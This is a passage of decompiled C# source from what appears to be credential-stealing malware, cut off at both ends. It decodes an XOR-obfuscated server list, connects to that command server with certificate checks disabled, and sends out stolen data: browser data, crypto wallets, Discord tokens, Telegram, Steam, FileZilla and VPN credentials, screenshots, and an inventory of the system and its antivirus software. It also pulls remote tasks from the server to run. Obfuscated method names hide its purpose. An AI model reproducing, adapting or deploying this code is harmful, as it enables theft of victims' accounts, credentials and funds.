			byte[] array = new byte[MaxAuthTagSize(intPtr)];
			int pcbResult = 0;
			if (BCryptDecrypt(hKey, cipherText, cipherText.Length, ref pPaddingInfo, array, array.Length, null, 0, ref pcbResult, 0) != 0)
			{
				throw new CryptographicException();
			}
			array2 = new byte[pcbResult];
			switch (BCryptDecrypt(hKey, cipherText, cipherText.Length, ref pPaddingInfo, array, array.Length, array2, array2.Length, ref pcbResult, 0))
			{
			case 3221266434u:
				throw new CryptographicException();
			default:
				throw new CryptographicException();
			case 0u:
				break;
			}
		}
		BCryptDestroyKey(hKey);
		Marshal.FreeHGlobal(hglobal);
		BCryptCloseAlgorithmProvider(intPtr, 0u);
		return array2;
	}

	private int MaxAuthTagSize(IntPtr hAlg)
	{
		byte[] property = GetProperty(hAlg, "AuthTagLength");
		return BitConverter.ToInt32(new byte[4]
		{
			property[4],
			property[5],
			property[6],
			property[7]
		}, 0);
	}

	private IntPtr OpenAlgorithmProvider(string alg, string provider, string chainingMode)
	{
		IntPtr phAlgorithm = IntPtr.Zero;
		if (BCryptOpenAlgorithmProvider(out phAlgorithm, alg, provider, 0u) != 0)
		{
			throw new CryptographicException();
		}
		byte[] bytes = Encoding.Unicode.GetBytes(chainingMode);
		if (BCryptSetAlgorithmProperty(phAlgorithm, "ChainingMode", bytes, bytes.Length, 0) != 0)
		{
			throw new CryptographicException();
		}
		return phAlgorithm;
	}

	private IntPtr ImportKey(IntPtr hAlg, byte[] key, out IntPtr hKey)
	{
		int num = BitConverter.ToInt32(GetProperty(hAlg, "ObjectLength"), 0);
		IntPtr intPtr = Marshal.AllocHGlobal(num);
		byte[] array = Concat(BitConverter.GetBytes(1296188491), BitConverter.GetBytes(1), BitConverter.GetBytes(key.Length), key);
		if (BCryptImportKey(hAlg, IntPtr.Zero, "KeyDataBlob", out hKey, intPtr, num, array, array.Length, 0u) != 0)
		{
			throw new CryptographicException();
		}
		return intPtr;
	}

	private byte[] GetProperty(IntPtr hAlg, string name)
	{
		int pcbResult = 0;
		if (BCryptGetProperty(hAlg, name, null, 0, ref pcbResult, 0u) != 0)
		{
			throw new CryptographicException();
		}
		byte[] array = new byte[pcbResult];
		if (BCryptGetProperty(hAlg, name, array, array.Length, ref pcbResult, 0u) != 0)
		{
			throw new CryptographicException();
		}
		return array;
	}

	public byte[] Concat(params byte[][] arrays)
	{
		int num = 0;
		byte[][] array = arrays;
		foreach (byte[] array2 in array)
		{
			if (array2 != null)
			{
				num += array2.Length;
			}
		}
		byte[] array3 = new byte[num - 1 + 1];
		int num2 = 0;
		array = arrays;
		foreach (byte[] array4 in array)
		{
			if (array4 != null)
			{
				Buffer.BlockCopy(array4, 0, array3, num2, array4.Length);
				num2 += array4.Length;
			}
		}
		return array3;
	}
}
public static class CryptoHelper
{
	public static string DecryptBlob(string EncryptedData, DataProtectionScope dataProtectionScope, byte[] entropy = null)
	{
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		return Encoding.UTF8.GetString(DecryptBlob(Encoding.GetEncoding(new string(new char[12]
		{
			'w', 'i', 'n', 'd', 'o', 'w', 's', '-', '1', '2',
			'5', '1'
		})).GetBytes(EncryptedData), dataProtectionScope, entropy));
	}

	public static byte[] DecryptBlob(byte[] EncryptedData, DataProtectionScope dataProtectionScope, byte[] entropy = null)
	{
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			if (EncryptedData == null || EncryptedData.Length == 0)
			{
				return null;
			}
			return ProtectedData.Unprotect(EncryptedData, entropy, dataProtectionScope);
		}
		catch (Exception)
		{
			return null;
		}
	}

	public static string GetMd5Hash(string source)
	{
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		byte[] bytes = Encoding.ASCII.GetBytes(source);
		return GetHexString(mD5CryptoServiceProvider.ComputeHash(bytes)).Replace("-", string.Empty);
	}

	private static string GetHexString(IList<byte> bt)
	{
		string text = string.Empty;
		for (int i = 0; i < bt.Count; i++)
		{
			byte num = bt[i];
			int num2 = num & 0xF;
			int num3 = (num >> 4) & 0xF;
			text = ((num3 <= 9) ? (text + num3.ToString(CultureInfo.InvariantCulture)) : (text + ((char)(num3 - 10 + 65)).ToString(CultureInfo.InvariantCulture)));
			text = ((num2 <= 9) ? (text + num2.ToString(CultureInfo.InvariantCulture)) : (text + ((char)(num2 - 10 + 65)).ToString(CultureInfo.InvariantCulture)));
			if (i + 1 != bt.Count && (i + 1) % 2 == 0)
			{
				text += "-";
			}
		}
		return text;
	}
}
public static class StringDecrypt
{
	public static string Xor(string input, string stringKey)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < input.Length; i++)
		{
			stringBuilder.Append(Convert.ChangeType(input[i] ^ stringKey[i % stringKey.Length], TypeCode.Char));
		}
		return stringBuilder.ToString();
	}

	private static string FromBase64(string base64str)
	{
		return BytesToStringConverted(Convert.FromBase64CharArray(base64str.ToCharArray(), 0, base64str.Length));
	}

	private static string BytesToStringConverted(byte[] bytes)
	{
		return Encoding.UTF8.GetString(bytes);
	}

	public static string Read(string b64, string stringKey)
	{
		try
		{
			if (string.IsNullOrWhiteSpace(b64))
			{
				return string.Empty;
			}
			return FromBase64(Xor(FromBase64(b64), stringKey));
		}
		catch
		{
			return b64;
		}
	}
}
public class EndpointConnection : IDisposable
{
	public Entity serviceInterface;

	public OperationContextScope Scope;

	public bool Connect(string address)
	{
		if (RequestConnection(address))
		{
			return TryGetConnection();
		}
		return false;
	}

	public bool RequestConnection(string address)
	{
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0034: Expected O, but got Unknown
		//IL_0063: Unknown result type (might be due to invalid IL or missing references)
		//IL_006d: Expected O, but got Unknown
		try
		{
			ChannelFactory<Entity> obj = new ChannelFactory<Entity>(SystemInfoHelper.CreateBind(), new EndpointAddress(new Uri("net.tcp://" + address + "/"), EndpointIdentity.CreateDnsIdentity("localhost"), (AddressHeader[])(object)new AddressHeader[0]));
			((ChannelFactory)obj).get_Credentials().get_ServiceCertificate().get_Authentication()
				.set_CertificateValidationMode((X509CertificateValidationMode)0);
			Entity entity = obj.CreateChannel();
			IContextChannel val = (IContextChannel)((entity is IContextChannel) ? entity : null);
			serviceInterface = val as Entity;
			Scope = new OperationContextScope(val);
			string text = "cfc1acacadc1f9b4aa6f2ee536369e47";
			MessageHeader val2 = MessageHeader.CreateHeader("Authorization", "ns1", (object)text);
			OperationContext.get_Current().get_OutgoingMessageHeaders().Add(val2);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public bool TryGetConnection()
	{
		try
		{
			return serviceInterface.Id1();
		}
		catch (Exception)
		{
			return false;
		}
	}

	public bool TryVerify(Entity7 result)
	{
		try
		{
			serviceInterface.Id3(result);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public bool TryGetArgs(out Entity2 args)
	{
		try
		{
			args = new Entity2();
			args = serviceInterface.Id2();
			return true;
		}
		catch (Exception)
		{
			args = new Entity2();
			return false;
		}
	}

	public Entity13 TryInit(Entity7 result)
	{
		try
		{
			return serviceInterface.Id4(result);
		}
		catch (Exception)
		{
			return Entity13.Id1;
		}
	}

	public Entity13 TryInitDisplay(byte[] result)
	{
		try
		{
			return serviceInterface.Id5(result);
		}
		catch (Exception)
		{
			return Entity13.Id1;
		}
	}

	public Entity13 TryInitBrowsers(List<Entity9> result)
	{
		try
		{
			return serviceInterface.Id11(result);
		}
		catch (Exception)
		{
			return Entity13.Id1;
		}
	}

	public Entity13 TryInitColdWallets(List<Entity5> result)
	{
		try
		{
			return serviceInterface.Id15(result);
		}
		catch (Exception)
		{
			return Entity13.Id1;
		}
	}

	public Entity13 TryInitDefenders(List<string> result)
	{
		try
		{
			return serviceInterface.Id6(result);
		}
		catch (Exception)
		{
			return Entity13.Id1;
		}
	}

	public Entity13 TryInitDiscord(List<Entity5> result)
	{
		try
		{
			return serviceInterface.Id21(result);
		}
		catch (Exception)
		{
			return Entity13.Id1;
		}
	}

	public Entity13 TryInitFtpConnections(List<Entity12> result)
	{
		try
		{
			return serviceInterface.Id12(result);
		}
		catch (Exception)
		{
			return Entity13.Id1;
		}
	}

	public Entity13 TryInitHardwares(List<Entity3> result)
	{
		try
		{
			return serviceInterface.Id10(result);
		}
		catch (Exception)
		{
			return Entity13.Id1;
		}
	}

	public Entity13 TryInitInstalledBrowsers(List<Entity4> result)
	{
		try
		{
			return serviceInterface.Id13(result);
		}
		catch (Exception)
		{
			return Entity13.Id1;
		}
	}

	public Entity13 TryInitInstalledSoftwares(List<string> result)
	{
		try
		{
			return serviceInterface.Id8(result);
		}
		catch (Exception)
		{
			return Entity13.Id1;
		}
	}

	public Entity13 TryInitLanguages(List<string> result)
	{
		try
		{
			return serviceInterface.Id7(result);
		}
		catch (Exception)
		{
			return Entity13.Id1;
		}
	}

	public Entity13 TryInitNordVPN(List<Entity12> result)
	{
		try
		{
			return serviceInterface.Id17(result);
		}
		catch (Exception)
		{
			return Entity13.Id1;
		}
	}

	public Entity13 TryInitOpenVPN(List<Entity5> result)
	{
		try
		{
			return serviceInterface.Id18(result);
		}
		catch (Exception)
		{
			return Entity13.Id1;
		}
	}

	public Entity13 TryInitProcesses(List<string> result)
	{
		try
		{
			return serviceInterface.Id9(result);
		}
		catch (Exception)
		{
			return Entity13.Id1;
		}
	}

	public Entity13 ExtendVРN(List<Entity5> result)
	{
		try
		{
			return serviceInterface.Id19(result);
		}
		catch (Exception)
		{
			return Entity13.Id1;
		}
	}

	public Entity13 TryInitScannedFiles(List<Entity5> result)
	{
		try
		{
			return serviceInterface.Id14(result);
		}
		catch (Exception)
		{
			return Entity13.Id1;
		}
	}

	public Entity13 TryInitSteamFiles(List<Entity5> result)
	{
		try
		{
			return serviceInterface.Id16(result);
		}
		catch (Exception)
		{
			return Entity13.Id1;
		}
	}

	public Entity13 TryInitTelegramFiles(List<Entity5> result)
	{
		try
		{
			return serviceInterface.Id20(result);
		}
		catch (Exception)
		{
			return Entity13.Id1;
		}
	}

	public bool TryConfirm()
	{
		try
		{
			serviceInterface.Id22();
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public bool TryGetTasks(Entity7 user, out IList<Entity6> remoteTasks)
	{
		try
		{
			remoteTasks = serviceInterface.Id23(user);
			return true;
		}
		catch (Exception)
		{
			remoteTasks = new List<Entity6>();
			return false;
		}
	}

	public bool TryCompleteTask(Entity7 user, int taskId)
	{
		try
		{
			serviceInterface.Id24(user, taskId);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public void Dispose()
	{
		Dispose(managed: true);
		GC.SuppressFinalize(this);
	}

	protected virtual void Dispose(bool managed)
	{
		if (managed && serviceInterface != null)
		{
			Entity entity = serviceInterface;
			Entity obj = ((entity is IClientChannel) ? entity : null);
			if (obj != null)
			{
				((ICommunicationObject)obj).Close();
			}
			Entity entity2 = serviceInterface;
			Entity obj2 = ((entity2 is IClientChannel) ? entity2 : null);
			if (obj2 != null)
			{
				((ICommunicationObject)obj2).Abort();
			}
			OperationContextScope scope = Scope;
			if (scope != null)
			{
				scope.Dispose();
			}
		}
	}
}
public static class Program
{
	private static void Main(string[] args)
	{
		Run();
	}

	public static void Run()
	{
		try
		{
			if (!string.IsNullOrWhiteSpace(Arguments.Message))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					//IL_0017: Unknown result type (might be due to invalid IL or missing references)
					MessageBox.Show(StringDecrypt.Read(Arguments.Message, Arguments.Key), "", (MessageBoxButton)0, (MessageBoxImage)16);
				});
				thread.IsBackground = true;
				thread.Start();
			}
			using EndpointConnection endpointConnection = new EndpointConnection();
			bool flag = false;
			while (!flag)
			{
				string[] array = StringDecrypt.Read(Arguments.IP, Arguments.Key).Split(new char[1] { '|' });
				foreach (string address in array)
				{
					if (endpointConnection.Connect(address))
					{
						flag = true;
						break;
					}
				}
				Thread.Sleep(5000);
			}
			Entity2 args = new Entity2();
			while (!endpointConnection.TryGetArgs(out args))
			{
				if (!endpointConnection.TryGetConnection())
				{
					throw new Exception();
				}
				Thread.Sleep(1000);
			}
			Entity7 entity = default(Entity7);
			entity.Id2 = StringDecrypt.Read(Arguments.ID, Arguments.Key);
			Entity7 result = entity;
			IdentitySenderBase identitySenderBase = SenderFactory.Create(Arguments.Version);
			while (!identitySenderBase.Send(endpointConnection, args, ref result))
			{
				Thread.Sleep(5000);
			}
			Entity7 user = result;
			user.Id7 = new Entity1();
			user.Id12 = null;
			IList<Entity6> remoteTasks = new List<Entity6>();
			user.Id8 = "UNKNWON";
			while (!endpointConnection.TryGetTasks(user, out remoteTasks))
			{
				if (!endpointConnection.TryGetConnection())
				{
					throw new Exception();
				}
				Thread.Sleep(1000);
			}
			foreach (int item in new TaskResolver(result).ReleaseUpdates(remoteTasks))
			{
				while (!endpointConnection.TryCompleteTask(user, item))
				{
					if (!endpointConnection.TryGetConnection())
					{
						throw new Exception();
					}
					Thread.Sleep(1000);
				}
			}
		}
		catch (Exception)
		{
			Run();
		}
	}
}
public static class Arguments
{
	public static string IP;

	public static string ID;

	public static string Message;

	public static string Key;

	public static int Version;

	static Arguments()
	{
		IP = "ATEwVCkEClwrJiBSKRxaWyEjIx0vDiAXJz9acQ==";
		ID = "GDA3PSg6DhYqHVhc";
		Message = "";
		Key = "Leadening";
		Version = 2;
	}
}
public class PartsSender : IdentitySenderBase
{
	public PartsSender()
	{
		IdentitySenderBase.Actions = new ParsSt[15]
		{
			asdk9345asd, asdk8jasd, ылв92р34выа, аловй, ыал8р45, ываш9р34, ывал8н34, вал93тфыв, вашу0л34, навева,
			ащы9р34, ыва83о4тфыв, askd435, asdasod9234oasd, длвап9345
		};
		IdentitySenderBase.PreStageActions = new ParsSt[6] { sdf934asd, asd44123, sdfi35sdf, sdfo8n234, asdkadu8, fdfg9i3jn4 };
		Random rnd = new Random();
		IdentitySenderBase.Actions = IdentitySenderBase.Actions.OrderBy((ParsSt x) => rnd.Next()).ToArray();
		IdentitySenderBase.PreStageActions = IdentitySenderBase.PreStageActions.OrderBy((ParsSt x) => rnd.Next()).ToArray();
	}

	public override bool Send(EndpointConnection connection, Entity2 settings, ref Entity7 result)
	{
		return sdf9j3nasd(connection, settings, ref result);
	}

	public static bool sdf9j3nasd(EndpointConnection connection, Entity2 settings, ref Entity7 result)
	{
		try
		{
			result.Id7 = new Entity1
			{
				Id2 = new List<string>(),
				Id6 = new List<Entity9>(),
				Id7 = new List<Entity12>(),
				Id16 = new List<Entity5>(),
				Id10 = new List<Entity5>(),
				Id8 = new List<Entity4>(),
				Id15 = new List<Entity5>(),
				Id12 = new List<Entity12>(),
				Id13 = new List<Entity5>(),
				Id4 = new List<string>(),
				Id14 = new List<Entity5>(),
				Id9 = new List<Entity5>(),
				Id11 = new List<Entity5>(),
				Id1 = new List<string>(),
				Id3 = new List<string>(),
				Id5 = new List<Entity3>()
			};
			result.Id11 = IPv4Helper.GetDefaultIPv4Address();
			result.Id15 = Visible();
			result.PreCheck();
			ParsSt[] preStageActions = IdentitySenderBase.PreStageActions;
			foreach (ParsSt parsSt in preStageActions)
			{
				try
				{
					parsSt(connection, settings, ref result);
				}
				catch (InvalidOperationException ex)
				{
					throw ex;
				}
				catch (Exception)
				{
				}
			}
			if (connection.TryInit(result) != Entity13.Id2)
			{
				throw new InvalidOperationException();
			}
			LSIDsd2(connection, settings, ref result);
			while (!connection.TryConfirm())
			{
				if (!connection.TryGetConnection())
				{
					Thread.Sleep(1000);
				}
			}
			return true;
		}
		catch (InvalidOperationException ex3)
		{
			throw ex3;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static bool Visible()
	{
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Yandex\\YaAddon");
			if (Directory.Exists(text))
			{
				if (((FileSystemInfo)new DirectoryInfo(text)).get_CreationTime() < DateTime.Now.AddMonths(-3))
				{
					Directory.Delete(text);
					Directory.CreateDirectory(text);
					return false;
				}
				return true;
			}
			Directory.CreateDirectory(text);
			return false;
		}
		catch
		{
		}
		return false;
	}

	public static bool LSIDsd2(EndpointConnection connection, Entity2 settings, ref Entity7 result)
	{
		try
		{
			ParsSt[] actions = IdentitySenderBase.Actions;
			foreach (ParsSt parsSt in actions)
			{
				try
				{
					parsSt(connection, settings, ref result);
				}
				catch (InvalidOperationException ex)
				{
					throw ex;
				}
				catch (Exception)
				{
				}
			}
			return true;
		}
		catch (InvalidOperationException ex3)
		{
			throw ex3;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static void asdkadu8(EndpointConnection connection, Entity2 settings, ref Entity7 result)
	{
		result.Id1 = CryptoHelper.GetMd5Hash(Environment.UserDomainName + Environment.UserName + SystemInfoHelper.GetSerialNumber()).Replace("-", string.Empty);
	}

	public static void sdfo8n234(EndpointConnection connection, Entity2 settings, ref Entity7 result)
	{
		result.Id14 = Assembly.GetExecutingAssembly().Location;
	}

	public static void sdfi35sdf(EndpointConnection connection, Entity2 settings, ref Entity7 result)
	{
		result.Id5 = InputLanguage.get_CurrentInputLanguage().get_Culture().EnglishName;
		result.Id4 = SystemInfoHelper.GetWindowsVersion();
	}

	public static void asd44123(EndpointConnection connection, Entity2 settings, ref Entity7 result)
	{
		result.Id6 = GdiHelper.MonitorSize().ToString();
	}

	public static void fdfg9i3jn4(EndpointConnection connection, Entity2 settings, ref Entity7 result)
	{
		result.Id10 = TimeZoneInfo.Local.DisplayName;
	}

	public static void sdf934asd(EndpointConnection connection, Entity2 settings, ref Entity7 result)
	{
		result.Id3 = Environment.UserName;
	}

	public static void asdk9345asd(EndpointConnection connection, Entity2 settings, ref Entity7 result)
	{
		List<Entity3> list = new List<Entity3>();
		foreach (Entity3 processor in SystemInfoHelper.GetProcessors())
		{
			list.Add(processor);
		}
		foreach (Entity3 graphicCard in SystemInfoHelper.GetGraphicCards())
		{
			list.Add(graphicCard);
		}
		list.Add(new Entity3
		{
			Id1 = new string(new char[12]
			{
				'T', 'o', 't', 'a', 'l', ' ', 'o', 'f', ' ', 'R',
				'A', 'M'
			}),
			Id3 = Entity14.Id2,
			Id2 = SystemInfoHelper.CollectMemory()
		});
		Entity13 num = connection.TryInitHardwares(list);
		if (num == Entity13.Id3)
		{
			asdk9345asd(connection, settings, ref result);
		}
		if (num == Entity13.Id4)
		{
			throw new InvalidOperationException();
		}
	}

	public static void asdk8jasd(EndpointConnection connection, Entity2 settings, ref Entity7 result)
	{
		Entity13 num = connection.TryInitInstalledBrowsers(SystemInfoHelper.GetBrowsers());
		if (num == Entity13.Id3)
		{
			asdk8jasd(connection, settings, ref result);
		}
		if (num == Entity13.Id4)
		{
			throw new InvalidOperationException();
		}
	}

	public static void ылв92р34выа(EndpointConnection connection, Entity2 settings, ref Entity7 result)
	{
		Entity13 num = connection.TryInitInstalledSoftwares(SystemInfoHelper.ListOfPrograms());
		if (num == Entity13.Id3)
		{
			ылв92р34выа(connection, settings, ref result);
		}
		if (num == Entity13.Id4)
		{
			throw new InvalidOperationException();
		}
	}

	public static void аловй(EndpointConnection connection, Entity2 settings, ref Entity7 result)
	{
		Entity13 num = connection.TryInitDefenders(SystemInfoHelper.GetVs()?.ToList());
		if (num == Entity13.Id3)
		{
			аловй(connection, settings, ref result);
		}
		if (num == Entity13.Id4)
		{
			throw new InvalidOperationException();
		}
	}

	public static void ыал8р45(EndpointConnection connection, Entity2 settings, ref Entity7 result)
	{
		Entity13 num = connection.TryInitProcesses(SystemInfoHelper.ListOfProcesses());
		if (num == Entity13.Id3)
		{
			ыал8р45(connection, settings, ref result);
		}
		if (num == Entity13.Id4)
		{
			throw new InvalidOperationException();
		}
	}

	public static void ываш9р34(EndpointConnection connection, Entity2 settings, ref Entity7 result)
	{
		Entity13 num = connection.TryInitLanguages(SystemInfoHelper.AvailableLanguages());
		if (num == Entity13.Id3)
		{
			ываш9р34(connection, settings, ref result);
		}
		if (num == Entity13.Id4)
		{
			throw new InvalidOperationException();
		}
	}

	public static void длвап9345(EndpointConnection connection, Entity2 settings, ref Entity7 result)
	{
		if (settings.Id5)
		{
			Entity13 num = connection.TryInitDisplay(GdiHelper.GetImageBase());
			if (num == Entity13.Id3)
			{
				длвап9345(connection, settings, ref result);
			}
			if (num == Entity13.Id4)
			{
				throw new InvalidOperationException();
			}
		}
	}

	public static void ывал8н34(EndpointConnection connection, Entity2 settings, ref Entity7 result)
	{
		if (settings.Id6)
		{
			List<Entity5> result2 = FileScanning.Search(new DesktopMessanger());
			Entity13 num = connection.TryInitTelegramFiles(result2);
			if (num == Entity13.Id3)
			{
				ывал8н34(connection, settings, ref result);
			}
			if (num == Entity13.Id4)
			{
				throw new InvalidOperationException();
			}
		}
	}

	public static void вал93тфыв(EndpointConnection connection, Entity2 settings, ref Entity7 result)
	{
		if (settings.Id1)
		{
			List<Entity9> list = new List<Entity9>();
			list.AddRange(EntityCreator.Sсаn(settings.Id11));
			list.AddRange(g_E_c_к_0.TryFind(settings.Id12));
			Entity13 num = connection.TryInitBrowsers(list);
			if (num == Entity13.Id3)
			{
				вал93тфыв(connection, settings, ref result);
			}
			if (num == Entity13.Id4)
			{
				throw new InvalidOperationException();
			}
		}
	}

	public static void вашу0л34(EndpointConnection connection, Entity2 settings, ref Entity7 result)
	{
		if (settings.Id2)
		{
			Entity13 num = connection.TryInitScannedFiles(FileSearcher.Search(settings.Id10));
			if (num == Entity13.Id3)
			{
				вашу0л34(connection, settings, ref result);
			}
			if (num == Entity13.Id4)
			{
				throw new InvalidOperationException();
			}
		}
	}

	public static void навева(EndpointConnection connection, Entity2 settings, ref Entity7 result)
	{
		if (settings.Id3)
		{
			Entity13 num = connection.TryInitFtpConnections(FileZilla.Scan());
			if (num == Entity13.Id3)
			{
				навева(connection, settings, ref result);
			}
			if (num == Entity13.Id4)
			{
				throw new InvalidOperationException();
			}
		}
	}

	public static void ащы9р34(EndpointConnection connection, Entity2 settings, ref Entity7 result)
	{
		if (settings.Id4)
		{
			BrEx brEx = new BrEx();
			brEx.Init(settings.Id11);
			List<Entity5> list = FileScanning.Search(new AllWallets(), brEx);
			list.AddRange(ConfigReader.Read(settings.Id13));
			Entity13 num = connection.TryInitColdWallets(list);
			if (num == Entity13.Id3)
			{
				ащы9р34(connection, settings, ref result);
			}
			if (num == Entity13.Id4)
			{
				throw new InvalidOperationException();
			}
		}
	}

	public static void ыва83о4тфыв(EndpointConnection connection, Entity2 settings, ref Entity7 result)
	{
		if (settings.Id9)
		{
			Entity13 num = connection.TryInitDiscord(Discord.GetTokens()?.ToList());
			if (num == Entity13.Id3)
			{
				ыва83о4тфыв(connection, settings, ref result);
			}
			if (num == Entity13.Id4)
			{
				throw new InvalidOperationException();
			}
		}
	}

	public static void askd435(EndpointConnection connection, Entity2 settings, ref Entity7 result)
	{
		if (settings.Id8)
		{
			Entity13 num = connection.TryInitSteamFiles(FileScanning.Search(new GameLauncher()));
			if (num == Entity13.Id3)
			{
				askd435(connection, settings, ref result);
			}
			if (num == Entity13.Id4)
			{
				throw new InvalidOperationException();
			}
		}
	}

	public static void asdasod9234oasd(EndpointConnection connection, Entity2 settings, ref Entity7 result)
	{
		if (settings.Id7)
		{
			connection.TryInitNordVPN(NordApp.Find());
			connection.TryInitOpenVPN(FileScanning.Search(new OpenVPN()));
			connection.ExtendVРN(FileScanning.Search(new РrоtoнVРN()));
		}
	}
}
public class FullInfoSender : IdentitySenderBase
{
	public FullInfoSender()
	{
		IdentitySenderBase.Actions = new ParsSt[15]
		{
			sdfk83hkasd, adkasd8u3hbasd, sdfk38jasd, slkahs2, asdak83jq, kasdihbfpfduqw, asdlasd9h34, dvsjiohq3, blvnzcwqe, aso0shq2,
			sdkf9h234as, asdoiad0123, asdaid9h24kasd, a9duh3zd, sdf923
		};
		IdentitySenderBase.PreStageActions = new ParsSt[6] { sf34asd21, sdfkas83, sdfm83kjasd, kkdhfakdasd, kadsoji83, gkdsi8y234 };
		Random rnd = new Random();
		IdentitySenderBase.Actions = IdentitySenderBase.Actions.OrderBy((ParsSt x) => rnd.Next()).ToArray();
		IdentitySenderBase.PreStageActions = IdentitySenderBase.PreStageActions.OrderBy((ParsSt x) => rnd.Next()).ToArray();
	}

	public override bool Send(EndpointConnection connection, Entity2 settings, ref Entity7 result)
	{
		return sdfk8h34(connection, settings, ref result);
	}

	public static bool sdfk8h34(EndpointConnection connection, Entity2 settings, ref Entity7 result)
	{
		try
		{
			result.Id7 = new Entity1
			{
				Id2 = new List<string>(),
				Id6 = new List<Entity9>(),
				Id7 = new List<Entity12>(),
				Id16 = new List<Entity5>(),
				Id10 = new List<Entity5>(),
				Id8 = new List<Entity4>(),
				Id15 = new List<Entity5>(),
				Id12 = new List<Entity12>(),
				Id13 = new List<Entity5>(),
				Id4 = new List<string>(),
				Id14 = new List<Entity5>(),
				Id9 = new List<Entity5>(),
				Id11 = new List<Entity5>(),
				Id1 = new List<string>(),
				Id3 = new List<string>(),
				Id5 = new List<Entity3>()
			};
			result.Id11 = IPv4Helper.GetDefaultIPv4Address();
			result.Id15 = Visible();
			result.PreCheck();
			ParsSt[] preStageActions = IdentitySenderBase.PreStageActions;
			foreach (ParsSt parsSt in preStageActions)
			{
				try
				{
					parsSt(connection, settings, ref result);
				}
				catch (InvalidOperationException ex)
				{
					throw ex;
				}
				catch (Exception)
				{
				}
			}
			asdk9y3(connection, settings, ref result);
			connection.TryVerify(result);
			return true;
		}
		catch (InvalidOperationException ex3)
		{
			throw ex3;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static bool Visible()
	{
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Yandex\\YaAddon");
			if (Directory.Exists(text))
			{
				if (((FileSystemInfo)new DirectoryInfo(text)).get_CreationTime() < DateTime.Now.AddMonths(-3))
				{
					Directory.Delete(text);
					Directory.CreateDirectory(text);
					return false;
				}
				return true;
			}
			Directory.CreateDirectory(text);
			return false;
		}
		catch
		{
		}
		return false;
	}

	public static bool asdk9y3(EndpointConnection connection, Entity2 settings, ref Entity7 result)
	{
		try
		{
			ParsSt[] actions = IdentitySenderBase.Actions;
			foreach (ParsSt parsSt in actions)
			{
				try
				{
					parsSt(connection, settings, ref result);
				}
				catch (InvalidOperationException ex)
				{
					throw ex;
				}
				catch (Exception)
				{
				}
			}
			return true;
		}
		catch (InvalidOperationException ex3)
		{
			throw ex3;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static void kadsoji83(EndpointConnection connection, Entity2 settings, ref Entity7 result)
	{
		result.Id1 = CryptoHelper.GetMd5Hash(Environment.UserDomainName + Environment.UserName + SystemInfoHelper.GetSerialNumber()).Replace("-", string.Empty);
	}

	public static void kkdhfakdasd(EndpointConnection connection, Entity2 settings, ref Entity7 result)
	{
		result.Id14 = Assembly.GetExecutingAssembly().Location;
	}

	public static void sdfm83kjasd(EndpointConnection connection, Entity2 settings, ref Entity7 result)
	{
		result.Id5 = InputLanguage.get_CurrentInputLanguage().get_Culture().EnglishName;
		result.Id4 = SystemInfoHelper.GetWindowsVersion();
	}

	public static void sdfkas83(EndpointConnection connection, Entity2 settings, ref Entity7 result)
	{
		result.Id6 = GdiHelper.MonitorSize().ToString();
	}

	public static void gkdsi8y234(EndpointConnection connection, Entity2 settings, ref Entity7 result)
	{
		result.Id10 = TimeZoneInfo.Local.DisplayName;
	}

	public static void sf34asd21(EndpointConnection connection, Entity2 settings, ref Entity7 result)
	{
		result.Id3 = Environment.UserName;
	}

	public static void sdfk83hkasd(EndpointConnection connection, Entity2 settings, ref Entity7 result)
	{
		List<Entity3> list = new List<Entity3>();
		foreach (Entity3 processor in SystemInfoHelper.GetProcessors())
		{
			list.Add(processor);
		}
		foreach (Entity3 graphicCard in SystemInfoHelper.GetGraphicCards())
		{
			list.Add(graphicCard);
		}
		list.Add(new Entity3
		{
			Id1 = new string(new char[12]
			{
				'T', 'o', 't', 'a', 'l', ' ', 'o', 'f', ' ', 'R',
				'A', 'M'
			}),
			Id3 = Entity14.Id2,
			Id2 = SystemInfoHelper.CollectMemory()
		});
		result.Id7.Id5 = list;
	}

	public static void adkasd8u3hbasd(EndpointConnection connection, Entity2 settings, ref Entity7 result)
	{
		result.Id7.Id8 = SystemInfoHelper.GetBrowsers();
	}

	public static void sdfk38jasd(EndpointConnection connection, Entity2 settings, ref Entity7 result)
	{
		result.Id7.Id3 = SystemInfoHelper.ListOfPrograms();
	}

	public static void slkahs2(EndpointConnection connection, Entity2 settings, ref Entity7 result)
	{
		result.Id7.Id1 = SystemInfoHelper.GetVs()?.ToList();
	}

	public static void asdak83jq(EndpointConnection connection, Entity2 settings, ref Entity7 result)
	{
		result.Id7.Id4 = SystemInfoHelper.ListOfProcesses();
	}

	public static void kasdihbfpfduqw(EndpointConnection connection, Entity2 settings, ref Entity7 result)
	{
		result.Id7.Id2 = SystemInfoHelper.AvailableLanguages();
	}

	public static void sdf923(EndpointConnection connection, Entity2 settings, ref Entity7 result)
	{
		if (settings.Id5)
		{
			result.Id12 = GdiHelper.GetImageBase();
		}
	}

	public static void asdlasd9h34(EndpointConnection connection, Entity2 settings, ref Entity7 result)
	{
		if (settings.Id6)
		{
			List<Entity5> id = FileScanning.Search(new DesktopMessanger());
			result.Id7.Id15 = id;
		}
	}

	public static void dvsjiohq3(EndpointConnection connection, Entity2 settings, ref Entity7 result)
	{
		if (settings.Id1)
		{
			List<Entity9> list = new List<Entity9>();
			list.AddRange(EntityCreator.Sсаn(settings.Id11));
			list.AddRange(g_E_c_к_0.TryFind(settings.Id12));
			result.Id7.Id6 = list;
		}
	}

